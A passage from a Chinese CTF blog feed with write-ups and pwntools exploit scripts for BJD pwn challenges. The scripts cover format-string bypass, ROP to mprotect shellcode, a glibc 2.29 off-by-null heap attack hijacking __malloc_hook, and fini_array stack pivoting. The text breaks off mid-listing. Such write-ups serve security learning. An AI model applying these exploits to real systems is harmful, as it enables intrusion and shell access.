    
      &lt;p&gt;本文首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/212563&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/212563&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;两天摸了三个pwn，剩下的cfgo-LuckyMaze，IDA反编译出来的代码实在太难看了，水平有限；baby_mac确实有相关的分析文章，无奈没有环境只能放弃。剩下三个好好总结一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>第三届 BJD: pwn</title>
    <link href="https://n0nop.com/2020/05/24/%E7%AC%AC%E4%B8%89%E5%B1%8A-BJD-pwn/"/>
    <id>https://n0nop.com/2020/05/24/%E7%AC%AC%E4%B8%89%E5%B1%8A-BJD-pwn/</id>
    <published>2020-05-23T16:03:18.000Z</published>
    <updated>2020-05-25T00:58:41.666Z</updated>
    
    <content type="html"><![CDATA[<p>嘴上说不能再打了，一堆事情没做，身体却很诚实。主要是奔着pwn来的，也没想着要冲榜啥的，纯当练习了。<br>OJ1的本地和远程环境的不一致让我与AK失之交臂，还是赛后问出题的师傅才发现思路是对的（难顶，我的本地感觉有毒，无数次死在本地环境上）。简单记录一下， 没有写的很详细。</p><a id="more"></a><h1 id="OJ0"><a href="#OJ0" class="headerlink" title="OJ0"></a>OJ0</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>做出来的人应该蛮多的，简单说一下思路：</p><ol><li>过滤了一些如”system”, “execve”的命令，过滤了”/bin”，只能想办法读flag</li><li>过滤了”flag”，”home”字符串，可以多种方法绕过，用”gets”读文件名，或者分开写都行</li><li>开始没注意可以得到提示，也就是flag的路径，所以用`opendir”和”readdir”读了下目录（多余了）</li></ol><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>没存，随便写都行。</p><h1 id="OJ1"><a href="#OJ1" class="headerlink" title="OJ1"></a>OJ1</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>有点难受，我的<code>main</code>可以在<code>.rodata</code>，可以在<code>.data</code>，可以<code>.bss</code>上，就是不能在<code>.text</code>上，难顶。</p><ol><li>过滤各种括号，用OJ0扒了一下源码，逻辑应该差不多，看了检查的逻辑，应该是绕不过</li><li>尝试中发现<code>int main = xxxx;</code>可以通过编译，调试一下发现<code>main</code>的代码是可以通过赋值控制的（但是我本地没法执行）。</li><li>那只要<code>char main = x; char a0 = x; char a1 = x; ...</code>布置shellcode就好了。</li></ol><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>没exp，当时没做出来。</p><h1 id="easybabystack"><a href="#easybabystack" class="headerlink" title="easybabystack"></a>easybabystack</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>在midnight ctf 2020 pwn4的基础上改的，主要的点就在这个fsb怎么绕过key的判断。</p><ol><li>用fsb绕过key的比较</li><li><code>read</code>一段orw的shellcode到bss上</li><li>调用<code>mprotect</code>修改bss为可执行段</li><li>跳到bss的shellcode上执行</li><li>这里我用orw是因为远程开shell打不通，加上本来fsb就要挺久时间，orw显然更稳一点</li></ol><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">system_plt = <span class="number">0x0000000000401114</span></span><br><span class="line">read_plt = <span class="number">0x0000000000401140</span></span><br><span class="line">read_got = <span class="number">0x404038</span></span><br><span class="line">open_plt = <span class="number">0x401180</span></span><br><span class="line">fprintf_got = <span class="number">0x404040</span></span><br><span class="line">mprotect_got = <span class="number">0x404050</span></span><br><span class="line"></span><br><span class="line">fst = <span class="number">0x00000000004020AA</span></span><br><span class="line"></span><br><span class="line">pop_rsp = <span class="number">0x000000000040172d</span> <span class="comment"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401733</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000401731</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">gadget_1 = <span class="number">0x0000000000401710</span></span><br><span class="line">gadget_2 = <span class="number">0x0000000000401726</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000401710 loc_401710:                             ; CODE XREF: init+54↓j</span></span><br><span class="line"><span class="string">.text:0000000000401710                 mov     rdx, r14</span></span><br><span class="line"><span class="string">.text:0000000000401713                 mov     rsi, r13</span></span><br><span class="line"><span class="string">.text:0000000000401716                 mov     edi, r12d</span></span><br><span class="line"><span class="string">.text:0000000000401719                 call    qword ptr [r15+rbx*8]</span></span><br><span class="line"><span class="string">.text:000000000040171D                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000401721                 cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000401724                 jnz     short loc_401710</span></span><br><span class="line"><span class="string">.text:0000000000401726</span></span><br><span class="line"><span class="string">.text:0000000000401726 loc_401726:                             ; CODE XREF: init+35↑j</span></span><br><span class="line"><span class="string">.text:0000000000401726                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:000000000040172A                 pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040172B                 pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040172C                 pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040172E                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000401730                 pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000401732                 pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000401734                 retn</span></span><br><span class="line"><span class="string">.text:0000000000401734 ; &#125; // starts at 4016D0</span></span><br><span class="line"><span class="string">.text:0000000000401734 init            endp</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%6$*18$d%5$n"</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = <span class="string">"123"</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x118</span></span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, elf.bss(<span class="number">0x600</span>), <span class="number">0x200</span>, read_got])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([pop_rsp, elf.bss(<span class="number">0x600</span>)])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendlineafter(<span class="string">"message: "</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x18</span></span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, elf.bss(<span class="number">0</span>) - <span class="number">0xA0</span>, <span class="number">0x1000</span>, <span class="number">7</span>, mprotect_got])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([elf.bss(<span class="number">0x6A0</span>)])</span><br><span class="line">orw = shellcraft.open(<span class="string">"flag"</span>)</span><br><span class="line">orw += shellcraft.read(<span class="string">"rax"</span>, elf.bss(<span class="number">0x800</span>), <span class="number">0x50</span>)</span><br><span class="line">orw += shellcraft.write(<span class="number">1</span>, elf.bss(<span class="number">0x800</span>), <span class="number">0x50</span>)</span><br><span class="line">payload += asm(orw)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="happyending"><a href="#happyending" class="headerlink" title="happyending"></a>happyending</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>刚开始本来就是想看看这道题的，因为发现是glibc2.29的off by null，没有学过，所以借机会学一下，能搜到相关的文章，所以就直接贴其他师傅的博客了（有时间再补充一下，感觉自己写博客印象会深刻一点，而且自己当时也调试了蛮久的）</p><ol><li><a href="http://blog.eonew.cn/archives/1233" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1233</a></li><li><a href="https://bbs.pediy.com/thread-257901.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257901.htm</a></li></ol><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><p>贴个exp仅供参考，感觉写得挺烂的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Your blessing words length :"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Best wishes to them!"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the idx to clean the debuff :"</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"input the idx to show your blessing :"</span>, str(index))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x1e4c40</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">__malloc_hook_offset = libc.symbols[<span class="string">"__malloc_hook"</span>]</span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">realloc_offset = libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># gap</span></span><br><span class="line">        <span class="comment"># add(0x16DA8, '0')</span></span><br><span class="line">        add(<span class="number">0x7DA8</span>, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># unsorted bin list</span></span><br><span class="line">        add(<span class="number">0x510</span>, <span class="string">'1'</span>)</span><br><span class="line">        add(<span class="number">0x18</span>, <span class="string">'2'</span>)</span><br><span class="line">        add(<span class="number">0x580</span>, <span class="string">'3'</span>)</span><br><span class="line">        <span class="comment"># add(0x518, '4')</span></span><br><span class="line">        add(<span class="number">0xF518</span>, <span class="string">'4'</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># large bin with address like 0xXXXXXXXXX0XX</span></span><br><span class="line">        add(<span class="number">0x1000</span>, <span class="string">'5'</span>)</span><br><span class="line">        add(<span class="number">0x18</span>, <span class="string">'6'</span>)</span><br><span class="line">        delete(<span class="number">5</span>)</span><br><span class="line">        add(<span class="number">0x1100</span>, <span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># victim chunk, bruteforce 4 bit</span></span><br><span class="line">        add(<span class="number">0x28</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x151</span>) + <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># prepare a fastbin and a fake victim-&gt;fd chunk</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">'8'</span>)</span><br><span class="line">        add(<span class="number">0xF8</span>, <span class="string">'9'</span>)</span><br><span class="line">        add(<span class="number">0x4F8</span>, <span class="string">'10'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fill tcache</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0x28</span>, str(<span class="number">11</span> + i))</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            delete(<span class="number">17</span> - i)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get unsorted bin list</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        delete(<span class="number">10</span>)</span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># victim-&gt;fd-&gt;bk = victim</span></span><br><span class="line">        add(<span class="number">0x510</span>, <span class="string">'1'</span> * <span class="number">8</span> + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># put to fastbin</span></span><br><span class="line">        delete(<span class="number">8</span>)</span><br><span class="line">        delete(<span class="number">7</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># tcache </span></span><br><span class="line">        delete(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get all tcache</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            add(<span class="number">0x28</span>, <span class="string">"target"</span> + str(i))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fetch the victim chunk</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        add(<span class="number">0x4F8</span>, <span class="string">'14'</span>)</span><br><span class="line">        add(<span class="number">0xF8</span>, p64(<span class="number">0xdead</span>) * <span class="number">30</span> + p64(<span class="number">0x150</span>))</span><br><span class="line">        delete(<span class="number">14</span>) </span><br><span class="line"></span><br><span class="line">        <span class="comment"># put int tcache</span></span><br><span class="line">        delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># leak libc</span></span><br><span class="line">        add(<span class="number">0x28</span>, <span class="string">"haha"</span>)</span><br><span class="line">        add(<span class="number">0x588</span>, <span class="string">'useup'</span>)</span><br><span class="line">        add(<span class="number">0x18</span>, <span class="string">'start'</span>)</span><br><span class="line">        show(<span class="number">14</span>)</span><br><span class="line">        p.recvline()</span><br><span class="line">        main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">        libc_base = main_arena - <span class="number">0x60</span> - main_arena_offset</span><br><span class="line">        libc_system = libc_base + system_offset</span><br><span class="line">        __free_hook = libc_base + __free_hook_offset</span><br><span class="line">        __malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">        libc_realloc = libc_base + realloc_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> _pwn_remote == <span class="number">0</span>:</span><br><span class="line">            p = process(argv=[_proc], env=_setup_env())</span><br><span class="line">            <span class="keyword">if</span> _debug != <span class="number">0</span>:</span><br><span class="line">                gdb.attach(p, gdbscript=_source)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'183.129.189.60'</span>, <span class="number">10106</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __malloc_hook __realloc_hook</span></span><br><span class="line">add(<span class="number">0x68</span>, p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">0x101</span>) + p64(__malloc_hook - <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0xF8</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="number">0xF8</span>, p64(one_gadget) + p64(libc_realloc + <span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Your blessing words length :"</span>, str(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory_Monster_I"></a>Memory_Monster_I</h1><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>直接打<code>__stack_chk_fail</code>为预留的后门函数地址，然后利用栈溢出触发后门函数getshell。</p><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0x404028</span>) + <span class="string">"A"</span> * <span class="number">0x50</span></span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(<span class="number">0x40124A</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory_Monster_II"></a>Memory_Monster_II</h1><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><p>跟pwnable.tw上的3x17一毛一样，因为直接改的3x17的脚本，这里就不赘述了，一搜一堆wp分析。<br><br>这里要改脚本是因为打不通，知识浅薄，原理尚不明确。特征在于好像”/bin/sh”的地址得用binary上面的，如果用自己布置在bss上的”/bin/sh”会假死（不过其实binary有现成的”/bin/sh”，自己布置也多此一举了)。<br><br>至于掉<code>execve</code>啥的，因为是静态编译，gadget一堆，所以随便写了。</p><h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">syscall = <span class="number">0x402514</span></span><br><span class="line">pop_rsp = <span class="number">0x402ef9</span> <span class="comment"># pop rsp; ret;</span></span><br><span class="line">pop_rdi = <span class="number">0x401746</span> <span class="comment"># pop rdi; ret;</span></span><br><span class="line">pop_rsi = <span class="number">0x4036fe</span> <span class="comment"># pop rsi; ret;</span></span><br><span class="line">pop_rdx = <span class="number">0x448415</span> <span class="comment"># pop rdx; ret;</span></span><br><span class="line">pop_rax = <span class="number">0x448fcc</span> <span class="comment"># pop rax; ret;</span></span><br><span class="line">leave = <span class="number">0x401CF3</span> <span class="comment"># leave; ret;</span></span><br><span class="line">fini_array_0 = <span class="number">0x4B80B0</span></span><br><span class="line">fini_array_1 = <span class="number">0x4B80B8</span></span><br><span class="line">bss = <span class="number">0x00000000004BF300</span> <span class="comment"># bss + 0x300</span></span><br><span class="line">main = <span class="number">0x401C1D</span></span><br><span class="line">__libc_csu_fini = <span class="number">0x402CB0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##############################################################</span></span><br><span class="line"><span class="comment"># _start ==&gt; __libc_start_main</span></span><br><span class="line"><span class="comment">#                  |                      /--&gt; init_array[0]</span></span><br><span class="line"><span class="comment">#                  +==&gt; __libc_csu_init  --&gt; ...</span></span><br><span class="line"><span class="comment">#                  |                      \--&gt; init_array[n]</span></span><br><span class="line"><span class="comment">#                  +==&gt; main</span></span><br><span class="line"><span class="comment">#                  |                      /--&gt; fini_array[n]</span></span><br><span class="line"><span class="comment">#                  +==&gt; __libc_csu_fini  --&gt; ...</span></span><br><span class="line"><span class="comment">#                                         \--&gt; fini_array[0]</span></span><br><span class="line"><span class="comment">###############################################################</span></span><br><span class="line"><span class="comment"># set fini_array_0 ==&gt; __libc_csu_fini</span></span><br><span class="line"><span class="comment">#     fini_array_1 ==&gt; main</span></span><br><span class="line"><span class="comment"># thus the program will execute as:</span></span><br><span class="line"><span class="comment"># main -&gt; __libc_csu_fini -&gt; main(fini_array_1) -&gt; libc_csu_fini(fini_array_0)</span></span><br><span class="line"><span class="comment">#                               ^                              |</span></span><br><span class="line"><span class="comment">#                               |                              |                       </span></span><br><span class="line"><span class="comment">#                               +------------------------------+</span></span><br><span class="line">payload = p64(fini_array_0)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(__libc_csu_fini) + p64(main)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># put data on bss (later will be set as fake stack)</span></span><br><span class="line">payload = p64(bss + <span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(pop_rdi) + p64(<span class="number">0x492895</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(bss + <span class="number">0x20</span>)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x401D00</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># since at this moment rbp == fini_array_0</span></span><br><span class="line"><span class="comment"># set fini_array_0 ==&gt; leave</span></span><br><span class="line"><span class="comment">#     fini_array_1 ==&gt; pop_rsp</span></span><br><span class="line"><span class="comment">#     fini_array_1 + 8 ==&gt; bss</span></span><br><span class="line"><span class="comment"># migrate stack to bss</span></span><br><span class="line">payload = p64(fini_array_0)</span><br><span class="line">p.sendafter(<span class="string">"addr:"</span>, payload)</span><br><span class="line">payload = p64(leave) + p64(pop_rsp)</span><br><span class="line">payload += p64(bss + <span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Memory-Monster-III"><a href="#Memory-Monster-III" class="headerlink" title="Memory_Monster_III"></a>Memory_Monster_III</h1><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><p>利用方法和上面一样，只不过没有现成的”/bin/sh”和<code>execve</code>可用，自己布置就行。</p><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 